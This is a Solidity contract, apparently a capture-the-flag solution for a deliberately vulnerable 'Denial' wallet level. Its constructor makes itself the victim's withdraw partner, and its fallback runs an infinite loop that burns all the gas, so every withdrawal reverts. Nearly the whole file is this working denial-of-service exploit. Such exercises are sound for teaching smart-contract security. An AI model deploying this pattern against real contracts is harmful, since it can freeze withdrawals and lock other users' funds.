// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    receive() external payable;
    function contractBalance() external view returns (uint);
}

contract HackDenial {
  constructor(Denial denial) {
    denial.setWithdrawPartner(address(this));
  }

  fallback() external payable {
    while (true) {}
  }
}